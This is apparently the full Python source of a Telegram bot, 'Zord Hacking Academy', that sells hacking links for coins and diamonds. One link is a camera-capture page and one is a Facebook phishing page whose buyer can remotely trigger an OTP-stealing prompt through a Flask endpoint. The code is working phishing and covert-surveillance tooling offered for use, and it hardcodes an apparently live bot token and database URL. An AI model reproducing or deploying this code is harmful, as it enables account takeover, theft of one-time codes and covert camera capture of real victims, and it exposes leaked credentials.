import telebot
from telebot import types
import requests
import time
from flask import Flask, jsonify
from flask_cors import CORS
from threading import Thread
import os
import random
import string

# --- সেটিংস ---
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
ADMIN_ID = 7068444019
ADMIN_USERNAME = "bcdatp10" 
CHANNEL_ID = "@hackingacademyX"
FIREBASE_URL = "https://bot-user-deta-default-rtdb.asia-southeast1.firebasedatabase.app/"
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

bot = telebot.TeleBot(BOT_TOKEN)
user_commands = {} 
temp_admin_data = {} # অ্যাডমিন ইনপুট সাময়িকভাবে রাখার জন্য

# --- রেন্ডার ও CORS সার্ভার ---
app = Flask('')
CORS(app)

@app.route('/')
def home(): return "Zord Hacking Bot is Online!"

@app.route('/get_command/<user_id>')
def get_command(user_id):
    status = user_commands.get(str(user_id), "loading")
    response = jsonify({"status": status})
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
def keep_alive(): Thread(target=run).start()

# --- ডাটাবেস ফাংশনসমূহ ---
def get_user(user_id):
    res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
    return res.json() or {"coins": 0, "diamonds": 0, "referral_count": 0, "status": "active"}

def save_user(user_id, data):
    requests.patch(f"{FIREBASE_URL}/users/{user_id}.json", json=data)

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- মেনু ডিজাইন ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start", "💰 My Assets")
    markup.row("👥 Refer", "🔥 Access")
    markup.row("ℹ️ Info")
    return markup

# --- স্টার্ট হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("চ্যানেলে জয়েন করুন 📢", url=f"https://t.me/hackingacademyX"))
        markup.add(types.InlineKeyboardButton("জয়েন করেছি ✅", callback_data="verify_join"))
        bot.send_message(user_id, "⚠️ **অ্যাক্সেস ডিনাইড!**\nচ্যানেলে জয়েন না করলে বোট সচল হবে না।", reply_markup=markup)
        return
    bot.send_message(user_id, "📡 **সিস্টেম অনলাইন...**\nZord Hacking Academy কনসোলে স্বাগতম।", reply_markup=main_menu())

# --- অ্যাডমিন প্যানেল শুরু ---
@bot.message_handler(commands=['admin'])
def admin_start(message):
    if message.chat.id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🪙 Coin Code", callback_data="admin_set_coin"),
                   types.InlineKeyboardButton("💎 Diamond Code", callback_data="admin_set_dia"))
        bot.send_message(ADMIN_ID, "🛠 **রিডিম কোড জেনারেটর**\nপ্রথমে সিলেক্ট করুন আপনি কিসের কোড বানাবেন:", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "❌ আপনি অ্যাডমিন নন!")

# --- টেক্সট মেসেজ ও মেনু লজিক ---
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id): return
    
    text = message.text
    data = get_user(user_id)

    if text == "🚀 Start":
        bot.send_message(user_id, "🚀 সিস্টেম রেডি।", reply_markup=main_menu())
    elif text == "💰 My Assets":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 প্রিমিয়াম পারচেজ", url=f"https://t.me/{ADMIN_USERNAME}"),
                   types.InlineKeyboardButton("🎁 রিডিম কোড দিন", callback_data="redeem_ui"))
        bot.send_message(user_id, f"📊 **ব্যালেন্স স্ট্যাটাস:**\n\n🪙 Coins: `{data.get('coins', 0)}` \n💎 Diamonds: `{data.get('diamonds', 0)}`", reply_markup=markup, parse_mode='Markdown')
    elif text == "👥 Refer":
        bot_username = bot.get_me().username
        link = f"https://t.me/{bot_username}?start={user_id}"
        bot.send_message(user_id, f"👥 **রেফারাল লিঙ্ক:**\n`{link}`\nপ্রতি রেফারে ৫০ কয়েন।")
    elif text == "🔥 Access":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📸 ক্যামেরা (10 Coin)", callback_data="buy_cam"),
                   types.InlineKeyboardButton("🔐 ফেসবুক (5 Diamond)", callback_data="buy_fb"))
        bot.send_message(user_id, "🛠 **টুলস সিলেক্ট করুন:**", reply_markup=markup)
    elif text == "ℹ️ Info":
        bot.send_message(user_id, "🏛 **Zord Hacking Academy**\n━━━━━━━━━━━━━━━━━━━━\n⚠️ সতর্কবার্তা: অপব্যবহারের জন্য ব্যবহারকারী দায়ী।", parse_mode='Markdown')

# --- কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = str(call.message.chat.id)
    data = get_user(user_id)

    # অ্যাডমিন ফ্লো: টাইপ সিলেক্ট
    if call.data.startswith("admin_set_"):
        asset_type = "coins" if "coin" in call.data else "diamonds"
        temp_admin_data[ADMIN_ID] = {"type": asset_type}
        msg = bot.send_message(ADMIN_ID, f"✅ আপনি **{asset_type}** সিলেক্ট করেছেন।\n\nএখন লিখুন কোডটি কত {asset_type}-এর হবে? (শুধু সংখ্যা লিখুন):")
        bot.register_next_step_handler(msg, admin_get_amount)

    elif call.data == "redeem_ui":
        msg = bot.send_message(user_id, "📩 আপনার রিডিম কোডটি এখানে লিখুন:")
        bot.register_next_step_handler(msg, process_redeem)

    elif call.data == "buy_cam":
        if data.get('coins', 0) >= 10:
            data['coins'] -= 10
            save_user(user_id, data)
            link = f"{BASE_URL}?id={user_id}&exp={int(time.time())+3600}"
            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক: `{link}`\n\n⚠️ সতর্কবার্তা: লিঙ্কের অপব্যবহারের জন্য আপনি দায়ী।")
        else: bot.answer_callback_query(call.id, "❌ যথেষ্ট কয়েন নেই!", show_alert=True)

    elif call.data == "buy_fb":
        if data.get('diamonds', 0) >= 5:
            data['diamonds'] -= 5
            save_user(user_id, data)
            user_commands[user_id] = "loading"
            link = f"{BASE_URL}fb/?id={user_id}&exp={int(time.time())+3600}"
            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক: `{link}`\n\n⚠️ সতর্কবার্তা: ওটিপি পেজ কন্ট্রোল করতে পারবেন।")
        else: bot.answer_callback_query(call.id, "❌ ডায়মন্ড নেই!", show_alert=True)

    elif call.data.startswith("open_otp_"):
        target_id = call.data.split("_")[2]
        user_commands[str(target_id)] = "show_otp"
        bot.answer_callback_query(call.id, "✅ ওটিপি পেজ পাঠানো হয়েছে!")

    elif call.data == "verify_join":
        if is_subscribed(user_id):
            bot.delete_message(user_id, call.message.message_id)
            bot.send_message(user_id, "✅ অ্যাকাউন্ট সচল হয়েছে।", reply_markup=main_menu())
        else: bot.answer_callback_query(call.id, "❌ আগে জয়েন করুন!", show_alert=True)

# --- অ্যাডমিন রিডিম কোড প্রসেস ---
def admin_get_amount(message):
    if not message.text.isdigit():
        msg = bot.send_message(ADMIN_ID, "❌ ভুল ইনপুট! দয়া করে শুধু সংখ্যা লিখুন (কত অ্যামাউন্ট):")
        bot.register_next_step_handler(msg, admin_get_amount)
        return
    temp_admin_data[ADMIN_ID]["amount"] = int(message.text)
    msg = bot.send_message(ADMIN_ID, "✅ অ্যামাউন্ট সেট করা হয়েছে।\n\nএখন লিখুন কোডটি **কতজন** ইউজার ব্যবহার করতে পারবে? (সংখ্যা দিন):")
    bot.register_next_step_handler(msg, admin_get_limit)

def admin_get_limit(message):
    if not message.text.isdigit():
        msg = bot.send_message(ADMIN_ID, "❌ ভুল ইনপুট! দয়া করে শুধু সংখ্যা লিখুন (কতজন ইউজার):")
        bot.register_next_step_handler(msg, admin_get_limit)
        return
    
    limit = int(message.text)
    asset_type = temp_admin_data[ADMIN_ID]["type"]
    amount = temp_admin_data[ADMIN_ID]["amount"]
    
    # র‍্যান্ডম কোড জেনারেশন
    code = "ZORD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    
    # ফায়ারবেসে সেভ করা
    promo_data = {
        "type": asset_type,
        "amount": amount,
        "limit": limit,
        "used_count": 0,
        "used_by": {}
    }
    requests.put(f"{FIREBASE_URL}/promo_codes/{code}.json", json=promo_data)
    
    bot.send_message(ADMIN_ID, f"🎉 **সফলভাবে রিডিম কোড তৈরি হয়েছে!**\n\n🎫 কোড: `{code}`\n💰 কিসের জন্য: {asset_type}\n💵 পরিমাণ: {amount}\n👥 ব্যবহারকারী সীমা: {limit} জন", parse_mode='Markdown')

# --- ইউজার রিডিম কোড প্রসেসিং ---
def process_redeem(message):
    user_id = str(message.chat.id)
    code_input = message.text.strip()
    
    # ফায়ারবেস থেকে কোড চেক
    res = requests.get(f"{FIREBASE_URL}/promo_codes/{code_input}.json")
    promo = res.json()

    if promo:
        used_by = promo.get("used_by", {})
        if user_id in used_by:
            bot.send_message(user_id, "❌ আপনি ইতিমধ্যে এই কোডটি ব্যবহার করেছেন!")
            return
        
        if promo["used_count"] >= promo["limit"]:
            bot.send_message(user_id, "❌ এই কোডটির ব্যবহারের সীমা শেষ হয়ে গেছে!")
            return
        
        # ব্যালেন্স আপডেট
        user_data = get_user(user_id)
        user_data[promo["type"]] += promo["amount"]
        save_user(user_id, user_data)
        
        # কোড স্ট্যাটাস আপডেট
        promo["used_count"] += 1
        promo["used_by"][user_id] = True
        requests.put(f"{FIREBASE_URL}/promo_codes/{code_input}.json", json=promo)
        
        bot.send_message(user_id, f"🎉 **অভিনন্দন!**\nআপনি সফলভাবে {promo['amount']} {promo['type']} রিডিম করেছেন।")
    else:
        bot.send_message(user_id, "❌ ভুল রিডিম কোড!")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
